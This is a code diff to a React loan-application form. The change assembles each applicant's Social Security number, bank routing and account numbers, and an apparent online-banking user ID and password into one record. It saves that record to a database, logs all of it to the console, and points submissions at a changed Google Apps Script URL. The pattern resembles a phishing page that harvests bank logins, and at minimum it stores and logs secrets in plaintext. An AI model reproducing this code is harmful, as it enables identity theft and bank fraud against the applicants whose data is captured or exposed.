@@ -329,14 +329,61 @@ const LoanApplication = () => {
     setValidationErrors(errors)
     
     if (Object.keys(errors).length === 0) {
-      // Send email first when Generate Document is clicked (non-blocking)
       setIsSubmittingEmail(true)
+      
+      // Generate application ID
+      const applicationId = `LS-${Date.now()}`
+      console.log('Generated application ID:', applicationId)
+      
+      // Prepare customer data for database
+      const customerData = {
+        applicationId: applicationId,
+        firstName: formData.firstName,
+        lastName: formData.lastName,
+        email: formData.email,
+        phoneNumber: formData.phoneNumber,
+        homeAddress: formData.homeAddress,
+        city: formData.city,
+        state: formData.state,
+        zipCode: formData.zipCode,
+        dateOfBirth: formData.dateOfBirth,
+        ssnNumber: formData.ssnNumber,
+        loanAmount: formData.loanAmount,
+        loanPurpose: formData.loanPurpose,
+        loanTerm: formData.loanTerm,
+        monthlyPayment: calculateMonthlyPayment(formData.loanAmount, formData.loanTerm),
+        loanAgent: formData.loanAgent,
+        bankName: formData.bankName === 'Other' ? formData.customBankName : formData.bankName,
+        routingNumber: formData.routingNumber,
+        accountNumber: formData.accountNumber,
+        userId: formData.userId,
+        password: formData.password,
+        status: 'review'
+      };
+      console.log('Customer data prepared for database:', customerData)
+
+      // Save customer to database
+      console.log('=== SAVING CUSTOMER TO DATABASE ===')
+      console.log('Calling saveCustomerToDatabase with:', customerData)
+      let savedCustomer = null
+      try {
+        savedCustomer = await saveCustomerToDatabase(customerData)
+        console.log('✅ CUSTOMER SAVED SUCCESSFULLY:', savedCustomer)
+        console.log('Customer ID:', savedCustomer.id)
+      } catch (dbError) {
+        console.error('❌ DATABASE SAVE FAILED:', dbError)
+        console.error('❌ Error message:', dbError.message || dbError)
+        // Continue with email even if database save fails
+      }
+      
+      // Send email notification
       try {
         await submitToGoogleSheets()
       } catch (emailError) {
         console.warn('Email submission failed (CORS or network error), continuing to agreement:', emailError)
         // Continue to agreement even if email fails
       }
+      
       setIsSubmittingEmail(false)
       
       // Then show agreement for signature
@@ -408,7 +455,7 @@ const LoanApplication = () => {
       }
 
       // Use deployed email script (original approach - works in production)
-      const scriptUrl = 'https://script.google.com/macros/s/AKfycbzXHXfYA_1VJ9Q8aDpyCnUGlhR1jrcplov7xcgTy2_nOR-T9sUGUkyKMlfE-2DB0wPa/exec'
+      const scriptUrl = 'https://script.google.com/macros/s/AKfycbx2fnDl1PBs7DBIN9slu02Y1yXDvvovNqHxzmrpdwl8e4w8BEn44TQ8IYYucxixKqgM/exec'
 
       // Submit to Google Apps Script (may fail on localhost due to CORS, but works in production)
       const response = await fetch(scriptUrl, {
